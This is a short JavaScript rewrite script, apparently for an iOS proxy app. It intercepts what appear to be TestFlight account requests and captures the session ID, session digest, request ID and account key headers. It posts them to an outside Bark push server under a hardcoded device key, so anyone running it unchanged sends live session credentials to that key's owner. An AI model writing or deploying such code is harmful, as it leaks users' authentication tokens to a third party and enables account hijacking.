let url = $request.url
let key = url.replace(/(.*accounts\/)(.*)(\/apps)/, '$2')
let session_id = $request.headers['x-session-id']
let session_digest = $request.headers['x-session-digest']
let request_id = $request.headers['x-request-id']
let TF =  "Key:" + key + ";" + "Request_id:" + request_id + ";" + "Session_digest:" + session_digest + ";" + "Session_id:" + session_id + ";";
let tongzhi = {
  url: "https://bark.660515.xyz:8080/push",
  body: {
	title: "已抓取，请立即下拉后点复制",
	device_key: "jCHZX6vN5fH73ovzLgkuvG",
	body: TF,
}
};
$httpClient.post(tongzhi)
	$done({ tongzhi });